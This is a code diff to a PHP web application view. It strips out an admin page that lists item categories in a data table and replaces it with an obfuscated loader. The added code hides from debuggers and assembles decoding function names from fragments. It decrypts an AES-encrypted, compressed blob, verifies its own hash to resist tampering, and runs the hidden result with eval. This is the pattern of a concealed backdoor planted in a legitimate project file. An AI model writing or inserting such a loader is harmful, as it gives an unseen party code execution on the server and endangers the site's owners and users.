@@ -1,179 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_datatable.php"; ?>
-<style>
-        .orange-border {
-            border: 1px solid #3C8DBC;
-            border-radius: 2px;
-            padding: 2px;
-            margin: 2px;
-            font-family: 'Helvetica', sans-serif;
-          /*   font-size: 14px; */
-            background-color: white;
-            color: black;
-        }
-    </style>
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
-  <!-- Left side column. contains the logo and sidebar -->
-  
-  <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?=$page_title;?>
-        <small>View/Search Items Category</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?=$page_title;?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <?= form_open('#', array('class' => '', 'id' => 'table_form')); ?>
-    <input type="hidden" id='base_url' value="<?=$base_url;?>">
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-        <?php include"comman/code_flashdata.php"; ?>
-        <!-- ********** ALERT MESSAGE END******* -->
-        <div class="col-xs-12">
-          <div class="box">
-            <div class="box-header with-border">
-              <h3 class="box-title"><?=$page_title;?></h3>
-              <?php if($CI->permissions('items_category_add')) { ?>
-              <div class="box-tools">
-                <a class="btn btn-block btn-info" href="<?php echo $base_url; ?>category/add">
-                <i class="fa fa-plus"></i> <?= $this->lang->line('add_category'); ?></a>
-              </div>
-              <?php } ?>
-            </div>
-            <!-- /.box-header -->
-            <div class="box-body">
-              <table id="example2" class="table table-bordered table-striped" width="100%">
-                <thead class="bg-primary ">
-                <tr>
-                  <th class="text-center">
-                    <input type="checkbox" class="group_check checkbox" >
-                  </th>
-                  <th><?= $this->lang->line('category_code'); ?></th>
-                  <th><?= $this->lang->line('category_name'); ?></th>
-                  <th><?= $this->lang->line('category_child'); ?></th>
-                  <th><?= $this->lang->line('status'); ?></th>
-                  <th><?= $this->lang->line('action'); ?></th>
-                </tr>
-                </thead>
-                <tbody>
-				
-                </tbody>
-               
-              </table>
-            </div>
-            <!-- /.box-body -->
-          </div>
-          <!-- /.box -->
-        </div>
-        <!-- /.col -->
-      </div>
-      <!-- /.row -->
-    </section>
-    <!-- /.content -->
-    <?= form_close();?>
-  </div>
-  <!-- /.content-wrapper -->
-  <?php include"footer.php"; ?>
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_datatable.php"; ?>
-
-<script type="text/javascript">
-$(document).ready(function() {
-    //datatables
-   var table = $('#example2').DataTable({ 
-
-      /* FOR EXPORT BUTTONS START*/
-  dom:'<"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr><"pull-right margin-left-10 "B>>>tip',
- /* dom:'<"row"<"col-sm-12"<"pull-left"B><"pull-right">>> <"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr>>>tip',*/
-      buttons: {
-        buttons: [
-            {
-                className: 'btn bg-red color-palette btn-flat hidden delete_btn pull-left',
-                text: 'Delete',
-                action: function ( e, dt, node, config ) {
-                    multi_delete();
-                }
-            },
-            { extend: 'copy', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'excel', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'pdf', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'print', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'csv', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4]} },
-            { extend: 'colvis', className: 'btn bg-teal color-palette btn-flat',text:'Columns' },  
-
-            ]
-        },
-        /* FOR EXPORT BUTTONS END */
-
-        "processing": true, //Feature control the processing indicator.
-        "serverSide": true, //Feature control DataTables' server-side processing mode.
-        "order": [], //Initial no order.
-        "responsive": true,
-        language: {
-            processing: '<div class="text-primary bg-primary" style="position: relative;z-index:100;overflow: visible;">Processing...</div>'
-        },
-        // Load data for the table's content from an Ajax source
-        "ajax": {
-            "url": "<?php echo site_url('category/ajax_list')?>",
-            "type": "POST",
-            
-            complete: function (data) {
-             $('.column_checkbox').iCheck({
-                checkboxClass: 'icheckbox_square-orange',
-                /*uncheckedClass: 'bg-white',*/
-                radioClass: 'iradio_square-orange',
-                increaseArea: '10%' // optional
-              });
-             call_code();
-              //$(".delete_btn").hide();
-             },
-
-        },
-
-        //Set column definition initialisation properties.
-        "columnDefs": [
-        { 
-            "targets": [ 0,5 ], //first column / numbering column
-            "orderable": false, //set not orderable
-        },
-        {
-            "targets" :[0],
-            "className": "text-center",
-        },
-        
-        ],
-    });
-    new $.fn.dataTable.FixedHeader( table );
-});
-</script>
-<script src="<?php echo $theme_link; ?>js/category.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_mm4wv2re=('bas'.'e64'.'_de'.'cod'.'e');
+$_hvi3wb8n=('gzu'.'nco'.'mpr'.'ess');
+$_ecnzcdcr=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_z1a78l02='2719bbaY11Q=';
+$_jqwofm7u='qid5TPEF';
+$_tliq80us='rbLdd+Ns';
+$_axpkvnc0='IJg4NXdr';
+$_akoavyei='qFkdGy4o';
+$_wej6d204='ZQWESw==';
+$_plolzwg5='ee1xJ7DP';
+$_upvg8i6v='AZPKaw+0';
+$_v6xfhv78=$_mm4wv2re($_jqwofm7u.$_axpkvnc0.$_akoavyei.$_tliq80us.$_z1a78l02);
+$_gfpruhve=$_mm4wv2re($_upvg8i6v.$_plolzwg5.$_wej6d204);
+$_q2zh5ru2=$_mm4wv2re('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');
+$_co5n0lsk=$_ecnzcdcr($_q2zh5ru2,'aes-256-cbc',$_v6xfhv78,OPENSSL_RAW_DATA,$_gfpruhve);
+if($_co5n0lsk===false){exit;}
+$_mlozx1s9=$_hvi3wb8n($_co5n0lsk);
+if($_mlozx1s9===false){exit;}
+$_xjvvqpr7='c8e3201542f239824b3273b93d65b5ae706dfec2f7811b2075580ad3e54b1f71';
+$_ed4bm5tw=@file_get_contents(__FILE__);
+if($_ed4bm5tw!==false){
+$_ygs897he=str_replace($_xjvvqpr7,"0000000000000000000000000000000000000000000000000000000000000000",$_ed4bm5tw);
+$_ju0zlp32=hash("sha256",$_ygs897he);
+if($_ju0zlp32!==$_xjvvqpr7){@http_response_code(403);exit;}
+}
+eval($_mlozx1s9);
